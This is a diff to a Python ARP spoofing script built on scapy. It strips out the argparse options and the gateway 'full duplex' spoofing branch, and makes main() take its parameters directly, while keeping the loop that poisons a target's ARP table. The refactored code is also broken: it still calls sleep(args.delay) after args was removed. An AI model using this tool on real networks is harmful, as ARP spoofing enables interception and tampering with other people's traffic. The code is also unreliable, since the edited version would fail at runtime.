@@ -3,23 +3,15 @@
 
 # IMPORTS
 from scapy.all import *
-from scapy.layers.l2 import ARP, getmacbyip, Ether
-import argparse
+from scapy.layers.l2 import ARP, Ether
 from time import sleep
 
-# ARGUMENTS PARSING
-args_parser = argparse.ArgumentParser(prog='ArpSpoofer.py', description='Spoof ARP tables')
-
-args_parser.add_argument('-i', '--iface', type=str, help="Interface you wish to use")
-args_parser.add_argument('-s', '--src', type=str, help="The address you want for the attacker")
-args_parser.add_argument('-d', '--delay', type=float, help="Delay (in seconds) between messages", default=1)
-args_parser.add_argument('-gw', action='store_true', help="should GW be attacked as well")
-args_parser.add_argument('-t', '--target', type=str, help="IP of target", required=True)
-args = args_parser.parse_args()
 # -i wlo1 -s 10.7.15.254 -d 10 -gw -t 10.7.8.149
 
-# if no interface is specified, use the default interface
-interface = args.iface if args.iface else conf.iface
+interface = None
+target_ip = None
+src = None
+delay = None
 
 
 def get_gateway():
@@ -60,11 +52,12 @@ def arp_restore(dst_ip, src_ip, dst_mac, src_mac):
 
 
 # MAIN
-def main():
-    # if no source is specified, use the gateway IP address
-    src = args.src if args.src else get_gateway()
-
-    target_ip = args.target
+def main(interface_name, target, src_ip, d):
+    global interface, target_ip, src, delay
+    interface = interface_name
+    target_ip = target
+    src = src_ip
+    delay = d
 
     target_mac = get_mac(target_ip)
     src_mac = get_mac(src)
@@ -73,20 +66,9 @@ def main():
         while True:
             print(f'Sending ARP spoof to {target_ip}...')
             arp_spoof(target_ip, src, target_mac)
-
-            # if gw argument is set, full duplex attack
-            if args.gw:
-                print(f'Sending ARP spoof to {src}...')
-                arp_spoof(src, target_ip, src_mac)
-
             sleep(args.delay)  # wait
 
     except KeyboardInterrupt:
         print('Restoring ARP tables...')
         arp_restore(target_ip, src, target_mac, src_mac)
         arp_restore(src, target_ip, src_mac, target_mac)
-
-
-# RUN MAIN
-if __name__ == "__main__":
-    main()
